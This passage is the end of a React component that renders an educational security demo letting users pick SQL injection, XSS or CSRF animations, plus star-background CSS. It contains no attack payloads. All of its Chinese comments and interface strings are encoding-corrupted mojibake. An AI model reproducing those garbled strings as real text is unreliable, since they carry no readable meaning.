      {/* åŠ¨ç”»å±•ç¤ºåŒºåŸŸ - æ ¹æ®æ˜¯å¦é€‰æ‹©äº†æ¼æ´ç±»å‹æ˜¾ç¤ºä¸åŒå†…å®¹ */}
      {activeVulnerability ? (
        // é€‰æ‹©äº†æ¼æ´ç±»å‹æ—¶æ˜¾ç¤ºåŠ¨ç”»å†…å®¹
        <div className="relative grid grid-cols-1 lg:grid-cols-2 gap-3 p-3 z-10">
          {/* å¯è§†åŒ–åŠ¨ç”»åŒºåŸŸ */}
          <div className="bg-gray-900/60 backdrop-blur-sm rounded-lg p-3 h-[200px] flex items-center justify-center">
            {renderVisualAnimation()}
          </div>
          
          {/* ç»ˆç«¯è¾“å‡ºåŒºåŸŸ */}
          <div 
            ref={terminalRef}
            className="bg-gray-950 text-green-300 font-mono text-xs p-3 rounded-lg h-[200px] overflow-y-auto border border-gray-700"
          >
            <div className="mb-2 text-blue-400">-- {activeVulnerability === 'sql-injection' ? 'SQLæ³¨å…¥æ”»å‡»' : activeVulnerability === 'xss' ? 'XSSè·¨ç«™è„šæœ¬æ”»å‡»' : 'CSRFè·¨ç«™è¯·æ±‚ä¼ªé€ '} æ¼”ç¤º --</div>
            {renderTerminalOutput()}
            {isPlaying && <div className="h-4 w-2 bg-green-500 inline-block ml-1 animate-pulse"></div>}
          </div>
        </div>
      ) : (
        // æœªé€‰æ‹©æ¼æ´ç±»å‹æ—¶æ˜¾ç¤ºå¼•å¯¼å†…å®¹
        <div className="relative p-6 text-center z-10">
          <p className="text-gray-300">é€‰æ‹©ä¸€ç§å®‰å…¨æ¼æ´ç±»å‹å¼€å§‹æ¼”ç¤º</p>
          <div className="mt-3 flex justify-center gap-8">
            {/* SQLæ³¨å…¥å›¾æ ‡ */}
            <div className="text-center">
              <div className="w-12 h-12 mx-auto bg-red-900/30 border border-red-700/50 rounded-full flex items-center justify-center mb-1 hover:bg-red-900/50 hover:border-red-600 transition-all duration-300 cursor-pointer" onClick={() => switchVulnerability('sql-injection')}>
                <span role="img" aria-label="sql injection" className="text-lg">ğŸ’‰</span>
              </div>
              <p className="text-xs text-red-400">SQLæ³¨å…¥</p>
            </div>
            {/* XSSæ”»å‡»å›¾æ ‡ */}
            <div className="text-center">
              <div className="w-12 h-12 mx-auto bg-amber-900/30 border border-amber-700/50 rounded-full flex items-center justify-center mb-1 hover:bg-amber-900/50 hover:border-amber-600 transition-all duration-300 cursor-pointer" onClick={() => switchVulnerability('xss')}>
                <span role="img" aria-label="xss" className="text-lg">ğŸ“</span>
              </div>
              <p className="text-xs text-amber-400">XSSæ”»å‡»</p>
            </div>
            {/* CSRFæ”»å‡»å›¾æ ‡ */}
            <div className="text-center">
              <div className="w-12 h-12 mx-auto bg-purple-900/30 border border-purple-700/50 rounded-full flex items-center justify-center mb-1 hover:bg-purple-900/50 hover:border-purple-600 transition-all duration-300 cursor-pointer" onClick={() => switchVulnerability('csrf')}>
                <span role="img" aria-label="csrf" className="text-lg">ğŸ”„</span>
              </div>
              <p className="text-xs text-purple-400">CSRFæ”»å‡»</p>
            </div>
          </div>
        </div>
      )}
      
      {/* ä¿¡æ¯æç¤ºåŒº */}
      <div className="relative bg-gray-900/60 backdrop-blur-sm p-3 border-t border-gray-700 z-10">
        <div className="text-xs text-gray-400">
          <p className="mb-1 flex items-center gap-1">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            æ­¤åŠ¨ç”»ä»…ç”¨äºæ•™è‚²ç›®çš„ï¼Œå±•ç¤ºç½‘ç»œå®‰å…¨æ¼æ´çš„å·¥ä½œåŸç†ã€‚
          </p>
          <p className="flex items-center gap-1">
            <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            äº†è§£è¿™äº›æ¼æ´æœ‰åŠ©äºå¼€å‘æ›´å®‰å…¨çš„åº”ç”¨ç¨‹åºã€‚
          </p>
        </div>
      </div>

      {/* æ˜Ÿç©ºåŠ¨ç”»æ ·å¼ */}
      <style jsx>{`
        .stars-container {
          background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
          z-index: 0;
        }
        
        .star {
          position: absolute;
          background-color: white;
          border-radius: 50%;
          opacity: 0;
          animation: twinkle var(--duration, 5s) infinite var(--delay, 0s);
        }
        
        .star:nth-child(1) { --size: 2px; width: var(--size); height: var(--size); left: 10%; top: 15%; --duration: 5s; --delay: 0.5s; }
        .star:nth-child(2) { --size: 1px; width: var(--size); height: var(--size); left: 20%; top: 25%; --duration: 6s; --delay: 1.5s; }
        .star:nth-child(3) { --size: 3px; width: var(--size); height: var(--size); left: 30%; top: 10%; --duration: 7s; --delay: 2.5s; }
        .star:nth-child(4) { --size: 1px; width: var(--size); height: var(--size); left: 40%; top: 20%; --duration: 8s; --delay: 0s; }
        .star:nth-child(5) { --size: 2px; width: var(--size); height: var(--size); left: 50%; top: 30%; --duration: 5s; --delay: 3s; }
        .star:nth-child(6) { --size: 1px; width: var(--size); height: var(--size); left: 60%; top: 5%; --duration: 6s; --delay: 1s; }
        .star:nth-child(7) { --size: 3px; width: var(--size); height: var(--size); left: 70%; top: 35%; --duration: 7s; --delay: 2s; }
        .star:nth-child(8) { --size: 2px; width: var(--size); height: var(--size); left: 80%; top: 15%; --duration: 8s; --delay: 0.5s; }
        .star:nth-child(9) { --size: 1px; width: var(--size); height: var(--size); left: 90%; top: 25%; --duration: 5s; --delay: 1.5s; }
        .star:nth-child(10) { --size: 2px; width: var(--size); height: var(--size); left: 15%; top: 40%; --duration: 6s; --delay: 2.5s; }
        .star:nth-child(11) { --size: 3px; width: var(--size); height: var(--size); left: 25%; top: 50%; --duration: 7s; --delay: 0s; }
        .star:nth-child(12) { --size: 1px; width: var(--size); height: var(--size); left: 35%; top: 60%; --duration: 8s; --delay: 3s; }
        .star:nth-child(13) { --size: 2px; width: var(--size); height: var(--size); left: 45%; top: 45%; --duration: 5s; --delay: 1s; }
        .star:nth-child(14) { --size: 1px; width: var(--size); height: var(--size); left: 55%; top: 55%; --duration: 6s; --delay: 2s; }
        .star:nth-child(15) { --size: 3px; width: var(--size); height: var(--size); left: 65%; top: 65%; --duration: 7s; --delay: 0.5s; }
        .star:nth-child(16) { --size: 2px; width: var(--size); height: var(--size); left: 75%; top: 75%; --duration: 8s; --delay: 1.5s; }
        .star:nth-child(17) { --size: 1px; width: var(--size); height: var(--size); left: 85%; top: 70%; --duration: 5s; --delay: 2.5s; }
        .star:nth-child(18) { --size: 2px; width: var(--size); height: var(--size); left: 95%; top: 85%; --duration: 6s; --delay: 0s; }
        .star:nth-child(19) { --size: 3px; width: var(--size); height: var(--size); left: 5%; top: 80%; --duration: 7s; --delay: 3s; }
        .star:nth-child(20) { --size: 1px; width: var(--size); height: var(--size); left: 15%; top: 90%; --duration: 8s; --delay: 1s; }
        .star:nth-child(21) { --size: 2px; width: var(--size); height: var(--size); left: 25%; top: 85%; --duration: 5s; --delay: 2s; }
        .star:nth-child(22) { --size: 1px; width: var(--size); height: var(--size); left: 35%; top: 95%; --duration: 6s; --delay: 0.5s; }
        .star:nth-child(23) { --size: 3px; width: var(--size); height: var(--size); left: 45%; top: 80%; --duration: 7s; --delay: 1.5s; }
        .star:nth-child(24) { --size: 2px; width: var(--size); height: var(--size); left: 55%; top: 90%; --duration: 8s; --delay: 2.5s; }
        .star:nth-child(25) { --size: 1px; width: var(--size); height: var(--size); left: 65%; top: 85%; --duration: 5s; --delay: 0s; }
        .star:nth-child(26) { --size: 2px; width: var(--size); height: var(--size); left: 75%; top: 95%; --duration: 6s; --delay: 3s; }
        .star:nth-child(27) { --size: 3px; width: var(--size); height: var(--size); left: 85%; top: 80%; --duration: 7s; --delay: 1s; }
        .star:nth-child(28) { --size: 1px; width: var(--size); height: var(--size); left: 95%; top: 90%; --duration: 8s; --delay: 2s; }
        .star:nth-child(29) { --size: 2px; width: var(--size); height: var(--size); left: 5%; top: 45%; --duration: 5s; --delay: 0.5s; }
        .star:nth-child(30) { --size: 3px; width: var(--size); height: var(--size); left: 95%; top: 45%; --duration: 6s; --delay: 1.5s; }
        
        @keyframes twinkle {
          0%, 100% { opacity: 0; transform: translateY(0); }
          25% { opacity: 0.8; transform: translateY(-1px); }
          50% { opacity: 1; transform: translateY(-2px); }
          75% { opacity: 0.8; transform: translateY(-1px); }
        }
      `}</style>
    </div>
  );
};

export default VulnerabilityDemo; 